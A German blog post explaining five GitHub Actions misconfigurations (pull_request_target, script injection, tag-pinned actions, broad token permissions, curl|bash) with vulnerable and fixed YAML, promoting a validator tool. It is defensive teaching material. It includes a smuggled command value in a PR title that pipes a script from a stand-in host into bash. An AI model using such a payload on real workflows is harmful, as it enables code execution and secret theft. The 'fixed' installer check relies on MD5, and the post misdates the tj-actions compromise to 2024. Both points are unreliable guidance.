---
title: "Die GitHub-Actions-Sicherheitsfehler, die Linter übersehen"
description: "YAML-Validatoren prüfen die Syntax, nicht die Angriffsfläche. Hier sind die fünf folgenschwersten GitHub-Actions-Fehlkonfigurationen — pull_request_target, Script Injection, ungepinnte Actions, zu weite GITHUB_TOKEN-Berechtigungen und curl|bash — jeweils mit dem fehlerhaften Muster und der zugehörigen Lösung."
pubDate: 2026-05-06
tags: ["github-actions", "security", "ci-cd"]
lang: de
translationOf: "github-actions-security-misconfigurations"
---

Ein YAML-Linter sagt Ihnen, wenn Ihr Workflow nicht geparst werden kann. Er sagt Ihnen nicht, wenn Ihr Workflow dem Pull Request eines Forks ein Schreibtoken aushändigt oder einen von einem Angreifer kontrollierten Branch-Namen als Shell-Code ausführt. Diese Fehler sind syntaktisch perfekt — sie bestehen jede Schemaprüfung, laufen beim ersten Versuch grün durch und vergrößern still und leise Ihre Angriffsfläche, bis es jemandem auffällt.

GitHub Actions ist ungewöhnlich exponiert, weil Workflows Code sind, der bei jedem Push ausgeführt wird — oft mit Secrets im Scope und einem Token, das in das Repository schreiben kann. Die folgenden Fehler sind diejenigen, die aus einer routinemäßigen CI-Pipeline einen Supply-Chain-Vorfall machen. Keiner von ihnen wird durch den reinen Syntax-Durchlauf von `actionlint` erkannt, und alle fünf sind so verbreitet, dass sie jede Woche in echten öffentlichen Repositories auftauchen.

## 1. `pull_request_target` checkt nicht vertrauenswürdigen Code aus

Der `pull_request_target`-Trigger läuft mit **den Secrets des Basis-Repositories und einem Lese-/Schreibtoken**, checkt aber standardmäßig den *Ziel*-Branch aus — und genau das macht ihn nützlich, um PRs zu labeln oder Kommentare aus Forks heraus zu posten. Die Falle besteht darin, den Head des PRs auszuchecken und ihn dann *auszuführen*. Damit wird von einem Angreifer kontrollierter Code mit Ihren Secrets im Scope ausgeführt.

```yaml
# BAD — runs fork code with repo secrets and a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # untrusted!
      - run: npm install && npm run build              # arbitrary code
```

Ein Angreifer öffnet einen PR, dessen `npm install` ein bösartiges `postinstall`-Skript ausführt, und dieses Skript kann `secrets.*` lesen oder das `GITHUB_TOKEN` exfiltrieren. Wenn Sie einen PR nur *inspizieren* müssen, verwenden Sie stattdessen `pull_request` (keine Secrets, schreibgeschütztes Token). Wenn Sie tatsächlich Secrets benötigen — etwa um einen Status zu posten —, teilen Sie die Arbeit auf: Bauen Sie nicht vertrauenswürdigen Code in einem `pull_request`-Job ohne Secrets und verarbeiten Sie dessen Ausgabe anschließend in einem separaten, vertrauenswürdigen Workflow.

```yaml
# FIXED — untrusted code runs without secrets
on: pull_request          # forked PRs get a read-only token, no secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # checks out PR head safely, unprivileged
      - run: npm ci && npm run build
```

Warum das wichtig ist: Dies ist das mit Abstand am häufigsten ausgenutzte Actions-Muster. Fork-PRs als nicht vertrauenswürdige Eingabe zu behandeln, ist der entscheidende Punkt.

## 2. Script Injection über `${{ github.event.* }}`

Alles, was ein Benutzer eingeben kann — ein PR-Titel, ein Branch-Name, ein Issue-Text, eine Commit-Nachricht —, wird von einem Angreifer kontrolliert. Wenn Sie es direkt in einen `run:`-Block interpolieren, setzt GitHub die rohe Zeichenkette in die Shell ein, *bevor* die Shell läuft, sodass ein präparierter Wert zu ausführbarem Code wird.

```yaml
# BAD — PR title is spliced straight into the shell
- name: Greet
  run: echo "Building PR: ${{ github.event.pull_request.title }}"
```

Ein PR mit dem Titel `"; curl evil.sh | bash #` verwandelt dieses eine `echo` in zwei Befehle. Die Lösung besteht darin, den nicht vertrauenswürdigen Wert über eine Umgebungsvariable zu übergeben. In `env:` gesetzte Variablen werden vom Runner nicht interpoliert — die Shell erhält sie als Daten, und das Quoting hält sie inert.

```yaml
# FIXED — value arrives as data, never as code
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $PR_TITLE"
```

Warum das wichtig ist: Es ist die einfachste Privilege Escalation in der CI und benötigt keinen besonderen Trigger — jeder Workflow, der von Benutzern bereitgestellten Text ausgibt, ist ein Kandidat. Die `env:`-Indirektion kostet zwei Zeilen und schließt die Lücke vollständig.

## 3. Drittanbieter-Actions, die an ein Tag gepinnt sind

`uses: some/action@v3` löst ein veränderliches Tag auf. Der Eigentümer — oder jeder, der dieses Konto kompromittiert — kann `v3` so verschieben, dass es auf neuen Code zeigt, und Ihr nächster Lauf zieht ihn, ohne dass Sie irgendetwas geändert haben. Tags sind bequeme Aliase, keine Integritätsgarantien.

```yaml
# BAD — mutable reference, can change under you
- uses: tj-actions/changed-files@v44
```

Pinnen Sie Drittanbieter-Actions an einen **vollständigen 40-stelligen Commit-SHA**. Ein SHA ist unveränderlich: Die einzige Möglichkeit, das Ausgeführte zu ändern, besteht darin, dass Sie ihn bewusst anheben — genau der Prüfpunkt, den Sie haben möchten. Halten Sie die menschenlesbare Version in einem nachgestellten Kommentar fest, damit Updates lesbar bleiben, und lassen Sie Dependabot die Pins für Sie anheben.

```yaml
# FIXED — immutable, auditable pin
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8 # v44.5.7
```

Warum das wichtig ist: Die Kompromittierung von `tj-actions/changed-files` im März 2024 — bei der ein bösartiger Commit hinter bestehende Tags geschoben wurde und Secrets aus Tausenden von Repositories ausgespäht wurden — betraf nur Workflows, die an Tags gepinnt waren. SHA-gepinnte Verbraucher blieben unberührt.

## 4. Zu weit gefasste `GITHUB_TOKEN`-Berechtigungen

Wenn Sie `permissions:` nie deklarieren, kann das automatische `GITHUB_TOKEN` je nach Organisations- und Repository-Einstellungen standardmäßig auf weitreichenden Lese-/Schreibzugriff über das gesamte Repository fallen. Das bedeutet, dass ein kompromittierter Schritt — etwa eine bösartige Abhängigkeit — Commits pushen, Releases bearbeiten oder Pull Requests öffnen kann, und zwar mit Ihrem eigenen Token.

```yaml
# BAD — no permissions block, token inherits broad defaults
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

Setzen Sie **einen schreibgeschützten Standard am Anfang des Workflows** und gewähren Sie Schreibrechte dann nur den spezifischen Jobs, die sie benötigen. Die meisten CI-Jobs benötigen nicht mehr als `contents: read`. Ein Job, der ein Release veröffentlicht oder einen Kommentar postet, erhält genau diesen einen Scope und nicht mehr.

```yaml
# FIXED — least privilege, scoped per job
on: push
permissions:
  contents: read            # workflow-wide default
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write       # only this job can write
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/publish.sh
```

Warum das wichtig ist: Least Privilege verwandelt „ein kompromittierter Schritt besitzt das Repository" in „ein kompromittierter Schritt kann Code lesen, den er ohnehin schon sehen konnte". Es ist die günstigste Reduzierung des Schadensradius, die Sie vornehmen können.

## 5. `curl | bash` innerhalb eines Schritts

Ein entferntes Skript direkt in eine Shell zu pipen, führt das aus, was diese URL *im Moment des Laufs* ausliefert — ohne Pin, ohne Prüfsumme und ohne Review. Wenn der Host kompromittiert wird, DNS gekapert wird oder der Maintainer einfach eine fehlerhafte Version pusht, läuft es auf Ihrem Runner mit Ihrem Token im Scope.

```yaml
# BAD — runs whatever the URL serves, unverified
- run: curl -sSL https://example.com/install.sh | bash
```

Pinnen Sie den Installer auf eine bekannte Version und verifizieren Sie dessen Prüfsumme vor der Ausführung — oder verwenden Sie besser eine geprüfte, SHA-gepinnte Setup-Action, die das bereits erledigt. Der Sinn ist, „welcher Code lief" zu einer Tatsache zu machen, die Sie im Nachhinein rekonstruieren können.

```yaml
# FIXED — download, verify, then run
- run: |
    curl -fsSL -o install.sh https://example.com/v1.2.3/install.sh
    echo "9b74c9897bac770ffc029102a200c5de  install.sh" | md5sum -c -
    bash install.sh
```

Warum das wichtig ist: `curl | bash` ist eine unsignierte, nicht versionierte Abhängigkeit, die Sie bei jedem Lauf erneut abrufen. Pinnen und Verifizieren verwandelt blindes Vertrauen in ein nachprüfbares.

## Fangen Sie diese Fehler ab, bevor sie gemergt werden

Jeder dieser Fehler besteht eine YAML-Schemaprüfung, weshalb ein Syntax-Linter direkt an ihnen vorbeigleitet. Es sind Erreichbarkeits- und Vertrauensprobleme, keine Parse-Probleme — und genau das, was ein Review eigentlich abfangen sollte, es aber auf den ersten Blick selten tut.

Der **GitHub Actions Validator** prüft alle fünf clientseitig, sobald Sie einen Workflow einfügen: Er kennzeichnet `pull_request_target`-Checkouts nicht vertrauenswürdiger Refs, `${{ }}`-Interpolation in `run:`-Schritten, ungepinnte Drittanbieter-Actions, fehlende oder zu weit gefasste `permissions:` und `curl | bash`-Aufrufe — neben den gewöhnlichen YAML-Fehlern. Nichts wird hochgeladen; Ihr Workflow verlässt niemals den Browser.

Wenn Sie jemals einen Workflow ausgeliefert und gehofft haben, dass er sicher ist, ist dies der Schritt, der dafür sorgt.

[Probieren Sie den GitHub Actions Validator aus →](/github-actions-validator)
